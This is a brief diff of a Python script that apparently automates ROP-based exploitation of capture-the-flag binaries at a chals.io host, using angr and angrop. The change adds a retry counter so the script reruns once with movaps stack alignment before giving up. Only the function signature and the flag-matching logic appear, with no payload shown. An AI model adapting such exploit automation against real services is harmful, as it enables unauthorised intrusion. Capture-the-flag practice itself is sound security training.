@@ -14,8 +14,8 @@ context.update(
 
 
 # REQUIRES ANGR AND ANGRROP TO BE INSTALLED
-# INITIAL CALL SHOULD BE exploit(binary,False)
-def exploit(binary: str, movaps):
+# INITIAL CALL SHOULD BE exploit(binary,False, 1)
+def exploit(binary: str, movaps, times):
     flag_regex = r'flag\{[^}]+\}'
 
     url = f'ace-service-{binary}.chals.io'
@@ -57,7 +57,9 @@ def exploit(binary: str, movaps):
     flag = re.findall(flag_regex, output.decode())
     if flag:
         return flag[0]
-    else:
+    elif times != 0:
         # second run around to avoid movaps
         #movaps = True
-        return exploit(binary,True)
+        return exploit(binary,True, 0)
+    else:
+        return None
